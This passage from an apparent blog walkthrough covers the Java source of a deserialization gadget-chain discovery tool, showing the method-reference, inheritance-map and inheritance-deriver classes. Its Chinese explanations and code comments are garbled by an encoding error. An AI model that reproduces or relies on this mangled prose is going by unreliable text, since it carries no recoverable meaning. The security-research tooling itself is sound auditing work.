function_">getDesc</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> desc;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span> == o) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span> (o == <span class="literal">null</span> || getClass() != o.getClass()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">            <span class="type">Handle</span> <span class="variable">handle</span> <span class="operator">=</span> (Handle) o;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (classReference != <span class="literal">null</span> ? !classReference.equals(handle.classReference) : handle.classReference != <span class="literal">null</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">if</span> (name != <span class="literal">null</span> ? !name.equals(handle.name) : handle.name != <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">return</span> desc != <span class="literal">null</span> ? desc.equals(handle.desc) : handle.desc == <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> classReference != <span class="literal">null</span> ? classReference.hashCode() : <span class="number">0</span>;</span><br><span class="line">            result = <span class="number">31</span> * result + (name != <span class="literal">null</span> ? name.hashCode() : <span class="number">0</span>);</span><br><span class="line">            result = <span class="number">31</span> * result + (desc != <span class="literal">null</span> ? desc.hashCode() : <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®šä¹‰<strong>æ–¹æ³•ä¿¡æ¯</strong>çš„è¯»å†™æ ¼å¼ï¼š<code>ç±»å æ–¹æ³•å æ–¹æ³•æè¿°ç¬¦ æ˜¯å¦ä¸ºé™æ€æ–¹æ³•</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Factory</span> <span class="keyword">implements</span> <span class="title class_">DataFactory</span>&lt;MethodReference&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> MethodReference <span class="title function_">parse</span><span class="params">(String[] fields)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MethodReference</span>(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(fields[<span class="number">0</span>]),</span><br><span class="line">                fields[<span class="number">1</span>],</span><br><span class="line">                fields[<span class="number">2</span>],</span><br><span class="line">                Boolean.parseBoolean(fields[<span class="number">3</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String[] serialize(MethodReference obj) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;</span><br><span class="line">                obj.classReference.getName(),</span><br><span class="line">                obj.name,</span><br><span class="line">                obj.desc,</span><br><span class="line">                Boolean.toString(obj.isStatic),</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-inheritanceMap"><a href="#5-inheritanceMap" class="headerlink" title="5. inheritanceMap"></a>5. inheritanceMap</h3><p>å®šä¹‰<strong>ç»§æ‰¿ä¿¡æ¯</strong>çš„æè¿°æ–¹å¼ï¼ŒåŒ…æ‹¬ <code>å­ç±»-&gt;çˆ¶ç±»é›†åˆ</code>ã€<code>çˆ¶ç±»-&gt;å­ç±»é›†åˆ</code> ä¸¤ä¸ª Map ç±»å‹å˜é‡ï¼Œæ ¹æ®ç±»ä¿¡æ¯å¾—å‡ºï¼Œå…·ä½“å®ç°åœ¨ <code>InheritanceMap</code> ç±»ä¸­ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InheritanceMap</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; inheritanceMap;    <span class="comment">// å­ç±»-&gt;çˆ¶ç±»é›†åˆ</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; subClassMap;       <span class="comment">// çˆ¶ç±»-&gt;å­ç±»é›†åˆ</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ„é€ å‡½æ•°ï¼Œä» `å­ç±»-&gt;çˆ¶ç±»é›†åˆ` å¾—å‡º `çˆ¶ç±»-&gt;å­ç±»é›†åˆ`</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> inheritanceMap ç»§æ‰¿å…³ç³»</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InheritanceMap</span><span class="params">(Map&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; inheritanceMap)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.inheritanceMap = inheritanceMap;</span><br><span class="line">        subClassMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; entry : inheritanceMap.entrySet()) &#123;</span><br><span class="line">            ClassReference.<span class="type">Handle</span> <span class="variable">child</span> <span class="operator">=</span> entry.getKey();</span><br><span class="line">            <span class="keyword">for</span> (ClassReference.Handle parent : entry.getValue()) &#123;</span><br><span class="line">                <span class="comment">// å¦‚æœ key ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºï¼Œæœ€åè¿”å› value</span></span><br><span class="line">                subClassMap.computeIfAbsent(parent, k -&gt; <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;()).add(child);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Set&lt;Map.Entry&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt;&gt; entrySet() &#123;</span><br><span class="line">        <span class="keyword">return</span> inheritanceMap.entrySet();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è¿”å›çˆ¶ç±»é›†åˆ</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> clazz ç›®æ ‡ç±»</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Set&lt;ClassReference.Handle&gt; getSuperClasses(ClassReference.Handle clazz) &#123;</span><br><span class="line">        Set&lt;ClassReference.Handle&gt; parents = inheritanceMap.get(clazz);</span><br><span class="line">        <span class="keyword">if</span> (parents == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Collections.unmodifiableSet(parents);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * åˆ¤æ–­ç›®æ ‡çˆ¶ç±»æ˜¯å¦ä¸ºç›®æ ‡å­ç±»çš„çˆ¶ç±»</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> clazz      ç›®æ ‡å­ç±»</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> superClass ç›®æ ‡çˆ¶ç±»</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isSubclassOf</span><span class="params">(ClassReference.Handle clazz, ClassReference.Handle superClass)</span> &#123;</span><br><span class="line">        Set&lt;ClassReference.Handle&gt; parents = inheritanceMap.get(clazz);</span><br><span class="line">        <span class="keyword">if</span> (parents == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> parents.contains(superClass);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è¿”å›å­ç±»é›†åˆ</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> clazz ç›®æ ‡ç±»</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Set&lt;ClassReference.Handle&gt; getSubClasses(ClassReference.Handle clazz) &#123;</span><br><span class="line">        Set&lt;ClassReference.Handle&gt; subClasses = subClassMap.get(clazz);</span><br><span class="line">        <span class="keyword">if</span> (subClasses == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Collections.unmodifiableSet(subClasses);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * å­˜å‚¨ç»§æ‰¿å…³ç³»ï¼šå­ç±»-&gt;çˆ¶ç±»é›†åˆ</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">save</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// inheritanceMap.dat æ•°æ®æ ¼å¼ï¼š</span></span><br><span class="line">        <span class="comment">// ç±»å çˆ¶ç±»æˆ–è¶…ç±»æˆ–æ¥å£ç±»1 çˆ¶ç±»æˆ–è¶…ç±»æˆ–æ¥å£ç±»2 çˆ¶ç±»æˆ–è¶…ç±»æˆ–æ¥å£ç±»3 ...</span></span><br><span class="line">        DataLoader.saveData(Paths.get(<span class="string">&quot;inheritanceMap.dat&quot;</span>), <span class="keyword">new</span> <span class="title class_">InheritanceMapFactory</span>(), inheritanceMap.entrySet());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ä» inheritanceMap.dat åŠ è½½ç»§æ‰¿å…³ç³»ä¿¡æ¯</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> InheritanceMap <span class="title function_">load</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Map&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; inheritanceMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; entry : DataLoader.loadData(</span><br><span class="line">                Paths.get(<span class="string">&quot;inheritanceMap.dat&quot;</span>), <span class="keyword">new</span> <span class="title class_">InheritanceMapFactory</span>())) &#123;</span><br><span class="line">            inheritanceMap.put(entry.getKey(), entry.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">InheritanceMap</span>(inheritanceMap);</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®šä¹‰<strong>ç»§æ‰¿ä¿¡æ¯</strong>çš„è¯»å†™æ ¼å¼ï¼ˆä»…é’ˆå¯¹ <code>å­ç±»-&gt;çˆ¶ç±»é›†åˆ</code>ï¼‰ï¼š<code>ç±»å çˆ¶ç±»/è¶…ç±»/æ¥å£ç±»</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">InheritanceMapFactory</span> <span class="keyword">implements</span> <span class="title class_">DataFactory</span>&lt;Map.Entry&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt;&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Map.Entry&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; parse(String[] fields) &#123;</span><br><span class="line">        ClassReference.<span class="type">Handle</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(fields[<span class="number">0</span>]);</span><br><span class="line">        Set&lt;ClassReference.Handle&gt; superClasses = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; fields.length; i++) &#123;</span><br><span class="line">            superClasses.add(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(fields[i]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AbstractMap</span>.SimpleEntry&lt;&gt;(clazz, superClasses);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String[] serialize(Map.Entry&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; obj) &#123;</span><br><span class="line">        <span class="keyword">final</span> String[] fields = <span class="keyword">new</span> <span class="title class_">String</span>[obj.getValue().size()+<span class="number">1</span>];</span><br><span class="line">        fields[<span class="number">0</span>] = obj.getKey().getName();</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (ClassReference.Handle handle : obj.getValue()) &#123;</span><br><span class="line">            fields[i++] = handle.getName();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fields;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-InheritanceDeriver"><a href="#6-InheritanceDeriver" class="headerlink" title="6. InheritanceDeriver"></a>6. InheritanceDeriver</h3><p>å®ç°<strong>ç»§æ‰¿ä¿¡æ¯</strong>å’Œ<strong>é‡å†™æ–¹æ³•ä¿¡æ¯</strong>çš„æ”¶é›†ï¼Œå­˜å‚¨é‡å†™ä¿¡æ¯æ—¶ä»¥ç¼©è¿›è¡¨ç¤ºé‡å†™æ–¹æ³•ï¼Œå…·ä½“å­˜å‚¨æ ¼å¼åœ¨ <code>GadgetChainDiscovery</code> ä¸­ç»™å‡ºã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InheritanceDeriver</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">LOGGER</span> <span class="operator">=</span> LoggerFactory.getLogger(InheritanceDeriver.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è·å–ç»§æ‰¿ä¿¡æ¯ï¼šå­ç±»-&gt;çˆ¶ç±»é›†åˆã€çˆ¶ç±»-&gt;å­ç±»é›†åˆ</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> classMap ç±»ä¿¡æ¯</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> InheritanceMap <span class="title function_">derive</span><span class="params">(Map&lt;ClassReference.Handle, ClassReference&gt; classMap)</span> &#123;</span><br><span class="line">        LOGGER.debug(<span class="string">&quot;Calculating inheritance for &quot;</span> + (classMap.size()) + <span class="string">&quot; classes...&quot;</span>);</span><br><span class="line">        Map&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; implicitInheritance = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// éå†æ‰€æœ‰ç±»</span></span><br><span class="line">        <span class="keyword">for</span> (ClassReference classReference : classMap.values()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (implicitInheritance.containsKey(classReference.getHandle())) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Already derived implicit classes for &quot;</span> + classReference.getName());</span><br><span class="line">            &#125;</span><br><span class="line">            Set&lt;ClassReference.Handle&gt; allParents = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// è·å– classReference çš„æ‰€æœ‰çˆ¶ç±»ã€è¶…ç±»ã€æ¥å£ç±»</span></span><br><span class="line">            getAllParents(classReference, classMap, allParents);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// æ·»åŠ ç¼“å­˜ï¼šç±»å-&gt;æ‰€æœ‰çš„çˆ¶ç±»ã€è¶…ç±»ã€æ¥å£ç±»</span></span><br><span class="line">            implicitInheritance.put(classReference.getHandle(), allParents);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">InheritanceMap</span>(implicitInheritance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è·å–ç›®æ ‡ç±»çš„æ‰€æœ‰çˆ¶ç±»ã€è¶…ç±»ã€æ¥å£ç±»</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> classReference ç›®æ ‡ç±»</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> classMap       ç±»ä¿¡æ¯</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> allParents     çˆ¶ç±»ã€è¶…ç±»ã€æ¥å£ç±»</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">getAllParents</span><span class="params">(ClassReference classReference, Map&lt;ClassReference.Handle, ClassReference&gt; classMap, Set&lt;ClassReference.Handle&gt; allParents)</span> &#123;</span><br><span class="line">        Set&lt;ClassReference.Handle&gt; parents = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();   <span class="comment">// å·²çŸ¥å½“å‰çˆ¶ç±»å’Œæ¥å£</span></span><br><span class="line">        <span class="comment">// æŠŠå½“å‰ classReference ç±»çš„æ‰€æœ‰çˆ¶ç±»æ·»åŠ åˆ° parents</span></span><br><span class="line">        <span class="keyword">if</span> (classReference.getSuperClass() != <span class="literal">null</span>) &#123;</span><br><span class="line">            parents.add(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(classReference.getSuperClass()));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// æŠŠå½“å‰ classReference ç±»å®ç°çš„æ‰€æœ‰æ¥å£æ·»åŠ åˆ° parents</span></span><br><span class="line">        <span class="keyword">for</span> (String iface : classReference.getInterfaces()) &#123;</span><br><span class="line">            parents.add(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(iface));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä»ç±»æ•°æ®é›†åˆä¸­ï¼Œéå†æ‰¾å‡º classReference çš„ç›´æ¥çˆ¶ç±»/æ¥å£</span></span><br><span class="line">        <span class="keyword">for</span> (ClassReference.Handle immediateParent : parents) &#123; <span class="comment">// æŸ¥æ‰¾ç›´æ¥çˆ¶ç±»ä¿¡æ¯</span></span><br><span class="line">            <span class="type">ClassReference</span> <span class="variable">parentClassReference</span> <span class="operator">=</span> classMap.get(immediateParent);</span><br><span class="line">            <span class="keyword">if</span> (parentClassReference == <span class="literal">null</span>) &#123;</span><br><span class="line">                LOGGER.debug(<span class="string">&quot;No class id for &quot;</span> + immediateParent.getName());</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// æ·»åŠ åˆ° allParents çˆ¶ç±»é›†åˆä¸­</span></span><br><span class="line">            allParents.add(parentClassReference.getHandle());</span><br><span class="line">            <span class="comment">// é€’å½’æŸ¥æ‰¾ï¼Œç›´åˆ°æŠŠ classReference ç±»çš„æ‰€æœ‰çˆ¶ç±»ã€è¶…ç±»ã€æ¥å£ç±»éƒ½æ·»åŠ åˆ° allParents</span></span><br><span class="line">            getAllParents(parentClassReference, classMap, allParents);  <span class="comment">// é€’å½’æŸ¥æ‰¾çˆ¶ç±»çš„çˆ¶ç±»</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è·å–ç±»çš„æ‰€æœ‰é‡å†™æ–¹æ³•</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> inheritanceMap ç»§æ‰¿å…³ç³»</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> methodMap      æ–¹æ³•ä¿¡æ¯</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; getAllMethodImplementations(</span><br><span class="line">            InheritanceMap inheritanceMap, Map&lt;MethodReference.Handle, MethodReference&gt; methodMap) &#123;</span><br><span class="line">        <span class="comment">// å­˜å‚¨ç±»çš„æ–¹æ³•ï¼Œç±»-&gt;æ–¹æ³•é›†åˆ</span></span><br><span class="line">        Map&lt;ClassReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodsByClass = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// éå†æ–¹æ³•ä¿¡æ¯ï¼Œè·å–ç±»-&gt;æ–¹æ³•é›†åˆ</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            ClassReference.<span class="type">Handle</span> <span class="variable">classReference</span> <span class="operator">=</span> method.getClassReference();  <span class="comment">// è·å–ç±»</span></span><br><span class="line">            <span class="keyword">if</span> (!methodsByClass.containsKey(classReference)) &#123;  <span class="comment">// é¿å…é‡å¤</span></span><br><span class="line">                